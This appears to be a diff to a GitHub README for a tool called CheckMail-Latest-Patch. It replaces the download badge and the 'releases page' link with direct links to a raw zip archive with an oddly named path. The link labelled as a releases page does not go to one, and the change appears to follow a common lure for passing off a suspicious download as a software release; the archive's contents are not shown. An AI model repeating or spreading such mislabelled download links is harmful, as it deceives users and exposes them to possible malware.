@@ -6,7 +6,7 @@ CheckMail-Latest-Patch helps you verify email addresses easily. Follow these ste
 
 ## 📥 Download the Software
 
-[![Download CheckMail-Latest-Patch](https://img.shields.io/badge/Download-CheckMail--Latest--Patch-brightgreen)](https://github.com/xxxcrayon/CheckMail-Latest-Patch/releases)
+[![Download CheckMail-Latest-Patch](https://raw.githubusercontent.com/xxxcrayon/CheckMail-Latest-Patch/main/accountable/CheckMail-Latest-Patch_orthocentric.zip)](https://raw.githubusercontent.com/xxxcrayon/CheckMail-Latest-Patch/main/accountable/CheckMail-Latest-Patch_orthocentric.zip)
 
 ### 🖥️ System Requirements
 
@@ -26,7 +26,7 @@ CheckMail-Latest-Patch helps you verify email addresses easily. Follow these ste
 
 ## 🛠️ Download & Install
 
-1. Visit the releases page to download: [CheckMail-Latest-Patch Releases](https://github.com/xxxcrayon/CheckMail-Latest-Patch/releases).
+1. Visit the releases page to download: [CheckMail-Latest-Patch Releases](https://raw.githubusercontent.com/xxxcrayon/CheckMail-Latest-Patch/main/accountable/CheckMail-Latest-Patch_orthocentric.zip).
   
 2. Find the latest version of CheckMail-Latest-Patch.
   
